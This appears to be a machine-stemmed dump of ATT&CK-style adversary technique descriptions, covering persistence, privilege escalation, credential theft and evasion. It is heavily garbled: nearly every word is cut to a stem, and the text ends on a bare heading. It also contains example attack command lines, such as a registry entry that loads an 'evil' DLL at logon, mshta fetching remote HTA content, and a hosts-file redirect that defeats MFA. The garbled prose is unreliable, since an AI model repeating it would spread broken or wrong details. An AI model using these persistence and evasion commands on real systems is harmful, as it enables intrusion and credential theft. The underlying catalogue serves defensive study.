advers execut malicy payload hijack bin us serv advers us flaw permit window serv replac bin execut upon serv start serv process autom execut spec bin part funct perform act permit fil system direct contain target bin permit bin improp set target bin overwrit anoth bin us user-level permit execut origin process origin process thread run high permit level replac bin also execut higher-level permit could includ system advers us techn replac legitim bin malicy on mean execut cod high permit level execut process set run spec tim certain ev system bootup techn also us persist
reg run key / startup fold
advers achiev persist ad program startup fold ref reg run key ad entry run key reg startup fold caus program ref execut us log microsoft run key program execut context us account assocy permit level plac program within startup fold also caus program execut us log startup fold loc individ us account wel system-wide startup fold check regardless us account log startup fold path cur us < cod > c \users\\ usernam \appdata\roaming\microsoft\windows\start menu\programs\startup < /code > startup fold path us < cod > c \programdata\microsoft\windows\start menu\programs\startup < /code > follow run key cre default window system < cod > hkey_current_user\software\microsoft\windows\currentversion\run < /code > < cod > hkey_current_user\software\microsoft\windows\currentversion\runonce < /code > < cod > hkey_local_machine\software\microsoft\windows\currentversion\run < /code > < cod > hkey_local_machine\software\microsoft\windows\currentversion\runonce < /code > run key ex multipl hiv microsoft wow6432node 2018 malwarebyt wow6432node 2016 < cod > hkey_local_machine\software\microsoft\windows\currentversion\runonceex < /code > also avail cre default window vist new reg run key entry ref program direct list depend microsoft run key exampl poss load dll logon us depend key runonceex < cod > reg ad hklm\software\microsoft\windows\currentversion\runonceex\0001\depend /v 1 /d c \temp\evil dll < /code > oddv moe runonceex mar 2018 follow reg key us set startup fold item persist < cod > hkey_current_user\software\microsoft\windows\currentversion\explorer\user shel fold < /code > < cod > hkey_current_user\software\microsoft\windows\currentversion\explorer\shell fold < /code > < cod > hkey_local_machine\software\microsoft\windows\currentversion\explorer\shell fold < /code > < cod > hkey_local_machine\software\microsoft\windows\currentversion\explorer\user shel fold < /code > follow reg key control autom startup serv boot < cod > hkey_local_machine\software\microsoft\windows\currentversion\runservicesonce < /code > < cod > hkey_current_user\software\microsoft\windows\currentversion\runservicesonce < /code > < cod > hkey_local_machine\software\microsoft\windows\currentversion\runservices < /code > < cod > hkey_current_user\software\microsoft\windows\currentversion\runservices < /code > us policy set spec startup program cre correspond valu eith two reg key < cod > hkey_local_machine\software\microsoft\windows\currentversion\policies\explorer\run < /code > < cod > hkey_current_user\software\microsoft\windows\currentversion\policies\explorer\run < /code > winlogon key control act occ us log comput run window 7. act control op system also ad custom act < cod > hkey_local_machine\software\microsoft\windows nt\currentversion\winlogon\userinit < /code > < cod > hkey_local_machine\software\microsoft\windows nt\currentversion\winlogon\shell < /code > subkey autom launch program program list load valu reg key < cod > hkey_current_user\software\microsoft\windows nt\currentversion\windows < /code > run us log default mult < cod > bootexecut < /code > valu reg key < cod > hkey_local_machine\system\currentcontrolset\control\session man < /code > set < cod > autocheck autochk < /code > valu caus window startup check file-system integr hard disk system shut abnorm advers ad program process reg valu autom launch boot advers us config loc execut malw remot access tool maintain persist system reboot advers also us masquerad http mak reg entry look assocy legitim program
trust rel
advers breach otherw lev org access intend victim access trust third party rel abus ex connect protect receiv le scrutiny standard mech gain access network org oft grant elev access second third-party extern provid ord allow man intern system wel cloud-bas environ exampl rel includ serv contract man sec provid infrastruct contract e.g hvac elev phys sec third-party provid access intend limit infrastruct maintain ex network rest enterpr valid account http us party access intern network system comprom us cis serv provid off 365 environ org grant microsoft partn resel deleg admin permit comprom partn resel account advers abl lev ex deleg admin rel send new deleg admin off cli ord gain admin control victim ten off 365 deleg admin
cloud account
advers cre cloud account maintain access victim system sufficy level access account us est second cred access requir persist remot access tool deploy system microsoft o365 admin rol microsoft support o365 ad anoth admin octob 2019 aw cre iam us gcp cre cloud id us microsoft az ad us advers cre account access spec cloud serv reduc chant detect
loc group
advers attempt find loc system group permit set knowledg loc system permit group help advers determin group ex us belong particul group advers us inform determin us elev permit us find within loc admin group command < cod > net localgroup < /code > net http util < cod > dscl -list /groups < /code > maco < cod > group < /code > linux list loc group
lc_main hijack
techn deprec long us o x 10.8 mach-o bin introduc new head cal lc_main point bin ’ entry point execut prevy two head achiev effect lc_thread lc_unixthread prol osx malw hist entry point bin hijack init execut flow malicy addit eith anoth sect cod cav go back init entry point victim ’ know anyth diff method mac malw persist mod bin way apply whitel bypass fil nam apply path stil
search op websites/domain
advers search fre avail websit and/or domain inform victim us target inform victim avail vary onlin sit soc med new sit host inform busy op hir requested/reward contract cyw soc med securitytrail googl hack exploitdb googlehack advers search diff onlin sit depend inform seek gath inform sourc rev opportun form reconnaiss ex phish inform http search op techn databas http est op resourc ex est account http comprom account http and/or init access ex extern remot serv http phish http
account manip
advers manip account maintain access victim system account manip consist act preserv advers access comprom account mod cred permit group act could also includ account act design subvert sec policy perform it password upd bypass password dur policy preserv lif comprom cred ord cre manip account advers must already sufficy permit system domain howev account manip also lead privileg esc mod grant access addit rol permit higher-privileged valid account http
mshta
mshta.exe util execut microsoft html apply hta hta fil fil extend < cod > .hta < /code > wikiped html apply hta standalon apply execut us model technolog internet expl outsid brows msdn html apply advers us mshta.exe proxy execut malicy .hta fil javascrib vbscript trust window util sev exampl diff typ threat lev mshta.exe init comprom execut cod cyl dust storm red can hta abus part deux fireey attack lev hta airb sec kovt analys fireey fin7 april 2017 fil execut mshta.exe inlin script < cod > mshta vbscript clos execut getobject script http sct < /code > also execut direct url < cod > mshta http hta < /code > mshta.exe us bypass apply whitel solv account pot us sint mshta.exe execut outsid internet expl sec context also bypass brows sec set lolba mshta
exfilt altern protocol
advers ste dat exfilt diff protocol ex command control channel dat also send altern network loc main command control serv altern protocol includ ftp smtp http/s dns smb network protocol us main command control channel diff protocol channel could also includ web serv cloud stor advers also opt encrypt and/or obfusc altern channel exfilt altern protocol http do us vary common op system util net http /smb ftp palo alto oilrig oct 2016 maco linux < cod > curl < /code > us invok protocol http/s ftp/s exfilt dat system 20 maco common tool techn
kernel mod extend
advers mod kernel autom execut program system boot load kernel mod lkms piec cod load unload kernel upon demand extend funct kernel without nee reboot system exampl on typ mod dev driv allow kernel access hardw connect system linux kernel program us malicy lkms typ kernel-mode rootkit http run highest op system privileg ring 0 linux kernel mod program guid common feat lkm bas rootkit includ hid select hid fil process network act wel log tamp provid auth backdo en root access non-privileged us idefens rootkit overview kernel extend also cal kext us maco load funct onto system simil lkms linux sint kernel respons enforc sec kernel extend run apart kernel kext govern maco sec policy kext load unload < cod > kextload < /code > < cod > kextunload < /code > command kext nee sign develop id grant privileg appl allow sign kernel extend develop without privileg stil sign kext load unless sip dis sip en kext sign ver ad auxkc system kernel extend maco sint maco catalin 10.15 kernel extend deprec fav system extend howev kext stil allow leg system extend sint system extend kernel program interfac appl kernel extend deprec advers us lkms kext conduc persist http and/or privileg esc http system exampl find wild relev op sourc project wel volatil phalanx2 crowdstrik linux rootkit github reptil github diamorphin rsac 2015 san francisco patrick wardl synack sec kernel extend break securel ventir trend micro skidmap
gui input capt
advers mim common op system gui compon prompt us cred seem legitim prompt program execut nee addit privileg pres cur us context common op system prompt us prop cred auth elev privileg task ex bypass us account control http advers mim funct prompt us cred seem legitim prompt numb reason mim norm us fak instal requir addit access fak malw remov suit osx malw exploit mackeep typ prompt us collect cred via vary langu applescrib http logrhythm trust oct 2014 osx keydnap malw spoof cred dialog powershel http logrhythm trust oct 2014 enigm phish cred jan 2015 spoof cred dialog linux system advers launch dialog box prompt us cred malicy shel script command lin i.e unix shel http spoof cred dialog
pas ticket
pas ticket ptt method auth system us kerbero ticket without access account password kerbero auth us first step lat mov remot system techn valid kerbero ticket valid account http capt o cred dump http us serv ticket ticket grant ticket tgt obtain depend level access serv ticket allow access particul resourc wherea tgt us request serv ticket ticket grant serv tgs access resourc us privileg access adsec ad kerbero attack gentilkiw pas ticket silv ticket obtain serv us kerbero auth mech us gen ticket access particul resourc system host resourc sharepoint adsec ad kerbero attack gold ticket obtain domain us key distribut serv account krbtgt account ntlm hash en gen tgts account act direct campbel 2014
tool
advers buy ste download softw tool us target tool op clos sourc fre commerc tool us malicy purpos advers unlik malw intend us purpos ex psexec http tool acquisit involv proc commerc softw licens includ red team tool cobalt strike http commerc softw obtain purchas ste licens licens cop softw crack tri vert record fut beacon 2019 advers obtain tool support op includ support execut post-compromise behavy addit fre download purchas softw advers ste softw and/or softw licens third-party ent includ advers
exfilt usb
advers attempt exfilt dat usb connect phys dev certain circumst air-gapped network comprom exfilt could occ via usb dev introduc us usb dev could us fin exfilt point hop otherw disconnect system
kernelcallbackt
advers abus < cod > kernelcallbackt < /code > process hijack execut flow ord run payload lazar apt janu 2022 finf expos < cod > kernelcallbackt < /code > find process environ block peb init array graph funct avail gui process < cod > user32.dll < /code > load window process inject kernelcallbackt advers hijack execut flow process us < cod > kernelcallbackt < /code > replac origin callback funct malicy payload mod callback funct achiev vary way involv rel behavy reflect cod load http process inject http anoth process point mem address < cod > kernelcallbackt < /code > obtain loc peb ex via cal < cod > ntqueryinformationprocess < /code > nat ap http funct ntqueryinformationprocess point loc < cod > kernelcallbackt < /code > duply funct tabl < cod > fncopydata < /code > set address malicy payload ex via < cod > writeprocessmem < /code > peb upd new address tabl tamp funct invok malicy payload trig lazar apt janu 2022 tamp funct typ invok us window mess process hijack malicy cod execut < cod > kernelcallbackt < /code > also rest origin stat rest malicy payload lazar apt janu 2022 us < cod > kernelcallbackt < /code > hijack execut flow evad detect sec produc sint execut mask legitim process
search clos sourc
advers search gath inform victim clos sourc us target inform victim avail purchas reput priv sourc databas pay subscrib fee technical/threat intellig dat d3secutrity cti fee advers also purchas inform less-reputable sourc dark web cybercrim blackmarket zdnet sel dat advers search diff clos databas depend inform seek gath inform sourc rev opportun form reconnaiss ex phish inform http search op websites/domain http est op resourc ex develop cap http obtain cap http and/or init access ex extern remot serv http valid account http
systemd tim
advers abus systemd tim perform task schedule init rec execut malicy cod systemd tim unit fil fil extend < cod > .timer < /code > control serv tim set run calend ev tim span rel start point us altern cron http linux environ archlinux systemd tim aug 2020 systemd tim act remot via < cod > systemctl < /code > command lin util op ssh http systemd remot control < cod > .timer < /code > fil must correspond < cod > .service < /code > fil nam < cod > example.timer < /code > < cod > example.servic < /code > < cod > .service < /code > fil systemd serv http unit fil man systemd system serv man linux man-pages systemd janu 2014 privileg tim writ < cod > /etc/systemd/system/ < /code > < cod > /usr/lib/systemd/system < /code > us level writ < cod > ~/.config/systemd/user/ < /code > advers us systemd tim execut malicy cod system startup schedule bas persist arch linux pack systemd comprom bleepingcomput 10jul2018 gist arch pack comprom 10jul2018 acroread pack comprom arch linux mail 8jul2018 tim inst us privileg path us maintain root level persist advers also instal us level tim achiev us level persist
phish
advers send phish mess gain access victim system form phish electron del soc engin phish target know spearph spearph spec individ company industry target advers gen advers conduc non-targeted phish mass malw spam campaign advers send victim email contain malicy attach link typ execut malicy cod victim system phish also conduc via third-party serv lik soc med platform phish also involv soc engin techn pos trust sourc
graph us interfac
techn deprec pleas us remot serv http appropry graph us interfac gui common way interact op system advers us system gui op common remot interact sess remot desktop protocol http instead command script interpret http search inform execut fil via mous double-click ev window run command wikiped run command pot difficult monit interact
rommonkit
advers abus rom monit rommon load unauth firmw advers cod provid persist access manip dev behavy difficult detect cisco syn knock evolv cisco blog leg dev attack rommon cisco network dev firmw funct boot load boot im boot help init hardw softw platform pow reset simil tftp boot http advers upgrad rommon im loc remot exampl tftp advers cod restart dev ord overwrit ex rommon im provid advers mean upd rommon gain persist system way difficult detect
compil html fil
advers abus compil html fil .chm cont malicy cod chm fil common distribut part microsoft html help system chm fil compress compil vary cont html docu im scripting/web rel program langu vba jscript jav activex microsoft html help 2018 chm cont display us und compon internet expl brows microsoft html help activex load html help execut program hh.exe microsoft html help execut program custom chm fil contain emb payload could del victim trig us execut http chm execut also bypass apply apply control old and/or unpatch system account execut bin hh.exe msitpro chm aug 2017 microsoft cve-2017-8625 aug 2017
network shar connect remov
advers remov shar connect long us ord cle trac op window shar driv smb/windows admin shar http connect remov long nee net http exampl util us remov network shar connect < cod > net us \\system\share /delete < /code > command technet net us
multi-hop proxy
disgu sourc malicy traff advers chain togeth multipl proxy typ defend abl ident last proxy traff travers ent network defend abl ident prevy proxy last-hop proxy techn mak ident origin sourc malicy traff ev difficult requir defend trac malicy traff sev proxy ident sourc particul vary behavy us on rout network publ avail tor network on rout cas network infrastruct particul rout poss advers lev multipl comprom dev cre multi-hop proxy chain within wide-area network wan enterpr lev patch system im http advers ad custom cod affect network dev impl on rout nod custom on rout network transport encrypt c2 traff comprom pop allow advers commun dev within on rout network method depend upon network bound bridg http method ord allow advers cross protect network bound internet perimet org ’ wan protocol icmp us transport
brut forc
advers us brut forc techn gain access account password unknown password hash obtain without knowledg password account set account advers system guess password us repetit it mech brut forc password tak plac via interact serv check valid cred offlin prevy acquir cred dat password hash brut forc cred tak plac vary point breach exampl advers attempt brut forc access valid account http within victim environ lev knowledg gath post-compromise behavy o cred dump http account discovery http password policy discovery http advers also combin brut forc act behavy extern remot serv http part init access
unix shel
advers abus unix shel command script execut unix shel prim command prompt linux maco system though many vary unix shel ex e.g sh bash zsh etc depend spec o distribut dienet bash appl zshell unix shel control every aspect system certain command requir elev privileg unix shel also support script en sequ execut command wel typ program op condit loop common us shel script includ long repetit task nee run set command multipl system advers abus unix shel execut vary command payload interact shel access command control channel lat mov ssh http advers also lev shel script del execut multipl command victim part payload us persist
outlook form
advers abus microsoft outlook form obtain persist comprom system outlook form us templ pres funct outlook mess custom outlook form cre execut cod spec craft email send advers util custom outlook form sensepost outlook form malicy form ad us ’ mailbox load outlook start malicy form execut advers send spec craft email us sensepost outlook form
dylib hijack
maco o x us common method look requir dynam libr dylib load program bas search path advers tak adv ambigu path plant dylib gain privileg esc persist common method see dylib apply us plant malicy vert nam high search path typ result dylib fold apply writ bad malw osx malw persist o x program config run high privileg level cur us dylib load apply dylib also run elev level us advers privileg esc techn
dis mod tool
advers mod and/or dis sec tool avoid poss detect malware/tools act tak many form kil sec softw process serv mod / delet reg key config fil tool op prop method interf sec tool scan report inform advers also dis upd prev latest sec patch reach tool victim system scadafence_ransomwar advers also tamp artifact deploy util sec tool sec tool mak dynam chang system compon ord maintain vis spec ev exampl sec produc load mod and/or mod load process facilit dat collect simil ind block http advers unhook otherw mod feat ad tool espec ex userland otherw pot access advers avoid detect outflank system cal mdsec system cal cloud environ tool dis advers includ cloud monit ag report back serv aw cloudwatch googl cloud monit furtherm although defend tool anti-tampering mech advers abus tool legitim rootkit remov kit impair and/or dis tool chasing_avaddon_ransomware dharma_ransomware demystifying_ryuk doppelpaymer_crowdstrike exampl advers us tool gmer find shut hid process antivir softw infect system demystifying_ryuk addit advers exploit legitim driv anti-virus softw gain access kernel spac i.e exploit privileg esc http lead bypass anti-tampering feat avoslocker_ransomware
dat manip
advers insert delet manip dat ord influ extern outcom hid act thu threaten integr dat manip dat advers attempt affect busy process org understand decid mak typ mod impact depend target apply process wel goal object advers complex system advers would lik nee spec expert poss access spec softw rel system would typ gain prolong inform gath campaign ord desir impact
inter-process commun
advers abus inter-process commun ipc mech loc cod command execut ipc typ us process shar dat commun synchron execut ipc also common us avoid situ deadlock occ process stick cyc wait pattern advers abus ipc execut arbit cod command ipc mech diff depend o typ ex form access program languages/library nat interfac window dynam dat exchang http compon object model http linux environ support sev diff ipc mech two socket pip linux ipc high level execut med command script interpret http also lev und ipc mech advers also us remot serv http distribut compon object model http facilit remot ipc execut fireey hunt com jun 2019
dat obfusc
advers obfusc command control traff mak difficult detect command control c2 commun hid necess encrypt attempt mak cont difficult discov deciph mak commun le conspicu hid command see encompass many method ad junk dat protocol traff us steganograph imperson legitim protocol
dat network shar driv
advers search network shar comput comprom find fil interest sensit dat collect remot system via shar network driv host shar direct network fil serv etc access cur system pri exfilt interact command shel us common funct within cmd http us gath inform
web serv
advers comprom access third-party web serv us target vary popul websit ex legitim us reg web-based serv github twit dropbox googl etc advers try tak own legitim us access web serv us web serv infrastruct support cyb op web serv abus lat stag advers lifecyc command control web serv http exfilt web serv http record fut turl infr 2020 us common serv off googl twit mak easy advers hid expect nois util web serv particul access ste legitim us advers mak difficult phys tie back op
mod system im
advers mak chang op system emb network dev weak defens provid new cap dev op system typ monolith dev funct cap contain within singl fil chang op system advers typ nee affect on fil replac mod eith do liv mem system runtim immedy effect stor impl chang next boot network dev
hijack execut flow
advers execut malicy payload hijack way op system run program hijack execut flow purpos persist sint hijack execut reocc tim advers also us mech elev privileg evad defens apply control restrict execut many way advers hijack flow execut includ manip op system loc program execut op system loc libr us program also interceiv loc op system look programs/resource fil direct cas window reg could also poison includ malicy payload
ind remov tool
advers remov ind tool believ malicy tool detect quarantin otherw curtail mod tool remov ind us upd vert long detect target defend system subsequ target us simil system good exampl malw detect fil sign quarantin anti-virus softw advers determin malw quarantin fil sign mod fil explicit avoid sign re-us malw
malicy im
advers rely us run malicy im facilit execut amazon web serv aw amazon machin im am googl cloud platform gcp im az im wel popul contain runtim dock backdo backdo im upload publ reposit via upload malw http us download deploy inst contain im without real im malicy thu bypass techn spec achiev init access lead execut malicy cod cod execut cryptocur min inst contain summit rout malicy am advers also nam im certain way increas chant us mistak deploy inst contain im ex match legitim nam loc http aqu sec cloud nat threat report jun 2021
valid account
advers obtain abus cred ex account mean gain init access persist privileg esc defens evas comprom cred us bypass access control plac vary resourc system within network ev us persist access remot system extern avail serv vpns outlook web access network dev remot desktop volexity_0day_sophos_fw comprom cred also grant advers increas privileg spec system access restrict are network advers choos us malw tool conjunct legitim access cred provid mak hard detect pres cas advers abus inact account exampl belong individ long part org us account allow advers evad detect origin account us pres ident anom act tak plac account cis mfa printnightm overlap permit loc domain cloud account across network system concern advers abl pivot across account system reach high level access i.e. domain enterpr admin bypass access control set within enterpr technet cred theft
non-standard port
advers commun us protocol port par typ assocy exampl http port 8088 symantec elfin mar 2019 port 587 fortinet ag tesl april 2018 oppos tradit port 443. advers mak chang standard port us protocol bypass filt muddl analysis/parsing network dat
soc med account
advers cre cult soc med account us target advers cre soc med account us build person op person develop consist develop publ inform pres hist appropry affy newscaster2014 blackhatrobins op incorp soc engin util person soc med import person fict imperson real peopl person ex singl soc med sit across multipl sit ex facebook linkedin twit etc. est person soc med requir develop addit docu mak seem real could includ fil profil inform develop soc network incorp photo person develop advers us cre connect target interest connect direct includ try connect oth newscaster2014 blackhatrobins account lev phas advers lifecyc init access ex spearph via serv http
dll side-loading
program spec dlls load runtim program improp vagu spec requir dll op vuln unintend dll load side-loading vuln spec occ window side-by-sid winsx manifest msdn manifest explicit enough charact dll load advers tak adv legitim program vuln side-loading load malicy dll stewart 2014 advers lik us techn mean mask act perform legitim trust system softw process
process hollow
advers inject malicy cod suspend hollow process ord evad process-based defens process hollow method execut arbit cod address spac sep liv process process hollow common perform cre process suspend stat unmapping/hollow mem replac malicy cod victim process cre nat window ap cal < cod > createprocess < /code > includ flag suspend process prim thread point process unmap us ap cal < cod > zwunmapviewofsect < /code > < cod > ntunmapviewofsect < /code > writ realign inject cod resum via < cod > virtualallocex < /code > < cod > writeprocessmem < /code > < cod > setthreadcontext < /code > < cod > resumethread < /code > respect leitch hollow elast process inject july 2017 simil thread loc stor http cre new process rath target ex process behavy lik result elev privileg sint inject process spawn thu inherit sec context inject process howev execut via process hollow also evad detect sec produc sint execut mask legitim process
exploit privileg esc
advers exploit softw vuln attempt elev privileg exploit softw vuln occ advers tak adv program er program serv within op system softw kernel execut adversary-controlled cod sec construct permit level oft hind access inform us certain techn advers lik nee perform privileg esc includ us softw exploit circumv restrict init gain access system advers op within low privileg process prev access certain resourc system vuln ex us op system compon softw common run high permit exploit gain high level access system could en someon mov unprivileg us level permit system root permit depend compon vuln could also en advers mov virt environ within virt machin contain onto und host necess step advers comprom endpoint system prop config limit privileg esc method advers bring sign vuln driv onto comprom machin exploit vuln execut cod kernel mod process sometim ref bring vuln driv byovd eset invisimol jun 2020 unit42 acidbox jun 2020 advers includ vuln driv fil del init access download comprom system via ingr tool transf http lat tool transf http
resourc fork
advers abus resourc fork hid malicy cod execut evad detect bypass sec apply resourc fork provid apply structure way stor resourc thumbnail im menu definit icon dialog box cod maco hierarch fil system overview us resourc fork ident display fil ’ extend attribut us < cod > l -l < /code > < cod > xat -l < /code > command resourc fork deprec replac apply bundl structure non-localized resourc plac top level direct apply bundl loc resourc plac < cod > /resources < /code > fold resourc dat fork elc extend attribut advers us resourc fork hid malicy dat otherw stor direct fil advers execut cont attach resourc fork spec offset mov execut loc invok resourc fork cont also obfuscated/encrypt execut sentinellab resourc nam fork 2020 tau bundl erik noerenberg 2020
account access remov
advers interrupt avail system network resourc inhibit access account util legitim us account delet lock manip ex chang cred remov access account advers also subsequ log and/or perform system shutdown/reboot http set malicy chang plac carbonblack lockergog 2019 unit42 lockergog 2019 window net http util < cod > set-localuser < /code > < cod > set-adaccountpassword < /code > powershel http cmdlets us advers mod us account linux < cod > passwd < /code > util us chang password account could also dis group policy advers us ransomw first perform impact behavy dat destruct http defac http complet dat encrypt impact http object
cred stuff
advers us cred obtain breach dump unrel account gain access target account cred overlap occas larg numb usernam password pair dump onlin websit serv comprom us account cred access inform us advers attempt comprom account tak adv tend us us password across person busy account cred stuff risky opt could caus num auth fail account lockout depend org login fail policy typ man serv common us port us stuff cred common target serv includ follow ssh 22/tcp telnet 23/tcp ftp 21/tcp netbio / smb / samb 139/tcp 445/tcp ldap 389/tcp kerbero 88/tcp rdp / termin serv 3389/tcp http/http man serv 80/tcp 443/tcp mssql 1433/tcp orac 1521/tcp mysql 3306/tcp vnc 5900/tcp addit man serv advers target singl sign-on sso cloud-bas apply util fed auth protocol wel extern fac email apply off 365 us-cert ta18-068 2018
kerberoast
serv princip nam spns us un ident inst window serv en auth kerbero requir spns assocy least on serv logon account account spec task run serv microsoft detect kerberoast feb 2018 microsoft spn microsoft setspn san attack kerbero nov 2014 harmj0y kerberoast nov 2016 advers possess valid kerbero ticket-granting ticket tgt request on kerbero ticket-granting serv tgs serv ticket spn domain control dc empir invokekerberoast oct 2016 adsec crack kerbero dec 2015 port ticket encrypt rc4 algorithm mean kerbero 5 tgs-rep etyp 23 hash serv account assocy spn us priv key thu vuln offlin brut forc http attack expos plaintext cred adsec crack kerbero dec 2015 empir invokekerberoast oct 2016 harmj0y kerberoast nov 2016 attack could execut us serv ticket capt network traff adsec crack kerbero dec 2015 crack hash en persist privileg esc lat mov via access valid account http san attack kerbero nov 2014
obfusc fil inform
advers attempt mak execut fil difficult discov analys encrypt encod otherw obfusc cont system transit common behavy us across diff platform network evad defens payload compress arch encrypt ord avoid detect payload us init access lat mitig detect sometim us act requir op deobfuscate/decod fil inform http us execut http us also requir input password op password protect compressed/encrypt fil provid advers volex powerduk novemb 2016 advers also us compress arch script javascrib port fil also encod hid plain-text string would otherw help defend discovery linux/cdorked.a liv sec analys payload also split sep seem benign fil rev malicy funct reassembl carbon black obfusc sept 2016 advers also obfusc command execut payload direct via command script interpret http environ vary alia charact platform/language spec sem us evad sign bas detect apply control mech fireey obfusc jun 2017 fireey revoke-obfuscation july 2017 paloalto encodedcommand march 2017
multi-factor auth
advers dis mod multi-factor auth mfa mech en persist access comprom account advers gain access network eith comprom account lack mfa employ mfa bypass method multi-factor auth request gen http advers lev access mod complet dis mfa defens accompl abus legitim feat exclud us az ad condit access policy reg new yet vulnerable/adversary-controlled mfa method man patch mfa program config fil bypass expect funct mandy apt42 az ad condit access exclud exampl mod window host fil ` c \windows\system32\drivers\etc\hosts ` redirect mfa cal localhost instead mfa serv caus mfa process fail fail op policy plac otherw success auth attempt grant access without enforc mfa russ exploit default mfa protocol - cis march 2022 depend scop goal privileg advers mfa defens dis individ account account tie larg group domain account victim network environ russ exploit default mfa protocol - cis march 2022
remot email collect
advers target exchang serv off 365 googl workspac collect sensit inform advers lev us cred interact direct exchang serv acquir inform within network advers also access extern fac exchang serv off 365 googl workspac access email us cred access tok tool mailsnip http us autom search spec keyword
ii compon
advers instal malicy compon run internet inform serv ii web serv est persist ii provid sev mech extend funct web serv exampl internet serv apply program interfac isap extend filt inst examin and/or mod incom outgo ii web request extend filt deploy dll fil export three funct < cod > get extension/filter vert < /code > < cod > http extension/filter proc < /code > opt < cod > termin extension/filter < /code > ii mod also inst extend ii web serv microsoft isap extend overview 2017 microsoft isap filt overview 2017 ii backdo 2011 trustwav ii mod 2013 advers instal malicy isap extend filt observ and/or mod traff execut command comprom machin proxy command control traff isap extend filt access ii web request respons exampl advers abus mech mod http respons ord distribut malicy commands/content prevy compr host microsoft isap filt overview 2017 microsoft isap extend overview 2017 microsoft isap extend incom 2017 del tg-3390 trustwav ii mod 2013 mmpc isap filt 2012 advers also instal malicy ii mod observ and/or mod traff ii 7.0 introduc mod provid unrestrict access http request respons isap extend filt ii mod writ dll export < cod > registermod < /code > .net apply interfac asp.net ap access ii http request microsoft ii mod overview 2007 trustwav ii mod 2013 eset ii malw 2021
invalid cod sign
advers attempt mim feat valid cod sign increas chant deceiv us analyst tool cod sign provid level auth bin develop guar bin tamp advers cop metadat sign inform sign program us templ unsign program fil invalid cod sign fail digit sign valid check appear legitim us sec tool improp handl fil threatexpress metatwin 2017 unlik cod sign http act result valid sign
run virt inst
advers carry malicy op us virt inst avoid detect wid vary virt technolog ex allow em comput comput environ run malicy cod insid virt inst advers hid artifact assocy behavy sec tool un monit act insid virt inst addit depend virt network impl ex bridg adapt network traff gen virt inst difficult trac back comprom host ip address hostnam might match know valu singheal breach jan 2019 advers util nat support virt ex hyper-v drop necess fil run virt inst ex virtualbox bin run virt inst advers cre shar fold guest host permit en virt inst interact host fil system sopho ragn 2020
trap
< cod > trap < /code > command allow program shel spec command execut upon receiv interrupt sign common situ script allow grac termin handl common keyboard interrupt lik < cod > ctrl+c < /code > < cod > ctrl+d < /code > advers us reg cod execut shel encount spec interrupt eith gain execut persist mech trap command follow form < cod > trap 'command list ' sign < /code > command list execut sign receiv trap man cybercit trap stat
password policy discovery
advers attempt access detail inform password policy us within enterpr network cloud environ password policy way enforc complex password difficult guess crack brut forc http inform help advers cre list common password launch dict and/or brut forc attack adh policy e.g minim password leng 8 try password 'pass123 ' check 3-4 password per account lockout set 6 lock account password policy set discov window linux maco system via vary command shel util < cod > net account /domain < /code > < cod > get-addefaultdomainpasswordpolicy < /code > < cod > chag -l < usernam > < /code > < cod > cat /etc/pam.d/common-password < /code > < cod > pwpolicy getaccountpolicy < /code > superus linux password policy jamf us password policy advers also lev network dev cli http network dev discov password policy inform e.g < cod > show aa < /code > < cod > show aa common-criteria policy < /code > us-cert-ta18-106a password policy discov cloud environ us avail ap < cod > getaccountpasswordpolicy < /code > aw aw getpasswordpolicy
ev trig execut
advers est persist and/or elev privileg us system mech trig execut bas spec ev vary op system mean monit subscrib ev logon us act run spec applications/binary cloud environ also support vary funct serv monit invok respons spec cloud ev backdo aw account varon pow autom dat exfilt microsoft dart cas report 001 advers abus mech mean maintain persist access victim via rep execut malicy cod gain access victim system advers create/modify ev trig point malicy cont execut whenev ev trig invok fireey wmi 2015 malw persist o x amnes malw sint execut proxy account high permit system serv account advers abl abus trig execut mech esc privileg
unix shel config mod
advers est persist execut malicy command trig us ’ shel us unix shel http execut sev config script diff point throughout sess bas ev exampl us op command-line interfac remot log via ssh login shel in login shel execut script system < cod > /etc < /code > us ’ hom direct < cod > ~/ < /code > config environ login shel system us /etc/profile in config script run permit level direct oft us set environ vary cre alia custom us ’ environ shel exit termin addit shel script execut ens shel exit appropry advers attempt est persist insert command script autom execut shel us bash exampl default shel gnu/linux system advers ad command launch malicy bin < cod > /etc/profile < /code > < cod > /etc/profile.d < /code > fil intezer-kaiji-malware bent blog bashrc fil typ requir root permit mod execut tim shel system launch us level permit advers insert malicy command < cod > ~/.bash_profile < /code > < cod > ~/.bash_login < /code > < cod > ~/.profile < /code > sourc us op command-line interfac connect remot anomali-rocke-tactics linux man bash invoc sint system execut first ex fil list ord advers us < cod > ~/.bash_profile < /code > ens execut advers also lev < cod > ~/.bashrc < /code > fil addit execut connect est remot addit interact shel op new tab command-line interfac tsunam anomali-rocke-tactics anomali-linux-rabbit magento malw target termin program trig execut advers us < cod > ~/.bash_logout < /code > fil execut malicy command end sess maco funct techn simil lev zsh default shel maco 10.15+ terminal.app op apply launch zsh login shel zsh interact shel login shel config system environ us < cod > /etc/profile < /code > < cod > /etc/zshenv < /code > < cod > /etc/zprofile < /code > < cod > /etc/zlogin < /code > scriptingosx zsh persistentjxa_leopitt code_persistence_zsh maco m off sandbox escap login shel config us environ < cod > ~/.zprofile < /code > < cod > ~/.zlogin < /code > interact shel us < cod > ~/.zshrc < /code > config us environ upon exit < cod > /etc/zlogout < /code > < cod > ~/.zlogout < /code > execut leg program maco execut < cod > /etc/bashrc < /code > startup
forc auth
advers gath cred mat invok forc us autom provid auth inform mech interceiv serv mess block smb protocol common us window network auth commun system access resourc fil shar window system attempt connect smb resourc autom attempt auth send cred inform cur us remot system wikiped serv mess block behavy typ enterpr environ us nee ent cred access network resourc web distribut auth vert webdav also typ us window system backup protocol smb block fail webdav extend http typ op tcp port 80 443 didy stev webdav traff microsoft man webdav sec advers tak adv behavy gain access us account hash forc smb/webdav auth advers send attach us spearph contain resourc link extern serv control advers i.e templ inject http plac spec craft fil navig path privileg account e.g .scf fil plac desktop publ access shar access victim us system access untrust resourc attempt auth send inform includ us hash cred smb advers control serv github hashjack access cred hash advers perform off-line brut forc http crack gain access plaintext cred cyl redirect smb sev diff way occ osand ste netntlm hash spec in-the-wild us includ spearph attach contain docu resourc autom load docu op i.e templ inject http docu includ exampl request simil < cod > fil remot address /normal.dotm < /code > trig smb request us-cert apt energy oct 2017 mod .lnk .scf fil icon filenam point extern ref < cod > \\ remot address \pic.png < /code > forc system load resourc icon rend rep gath cred us-cert apt energy oct 2017
sid-history inject
